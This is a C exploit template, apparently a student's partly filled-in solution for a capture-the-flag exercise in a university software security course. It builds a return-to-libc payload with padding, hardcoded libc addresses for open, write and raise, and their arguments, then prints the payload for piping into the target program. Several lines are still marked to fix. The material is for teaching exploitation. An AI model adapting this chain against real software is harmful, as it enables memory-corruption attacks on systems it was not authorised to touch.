/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\xf0\xea\xec\xb3" 					//<open> 0xb3eceaf0
	"\x5d\x89\xe1\xb3"  				//<return> 0001e86d +  0xb3dfa0f0 = 0xB3E1895D
	"\x2c\xc3\xff\xbf" 					//<first param> *fix
	"\x01\x00\x00\x00"					//<second param>
	"\x00\x00\x00\x00"					//<third param>
	"\x10\xf0\xec\xb3" 					//<write> 0xb3ecf010
	"\x5d\x89\xe1\xb3"					//<return>  0001e86d +  0xb3dfa0f0 = 0xB3E1895D
	"\x03\x00\x00\x00"					//<first param> 
	"\x90\x90\x90\x90"					//<second param> *fix
	"\x06\x00\x00\x00"					//<third param>
	"\x40\x1d\xe1\xb3"					//<raise> 0xb3e11d40
	"\x0c\x00\x00\x00"					//<first param>
	"magic.txt\0"
	"xyzzy\0";						


	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
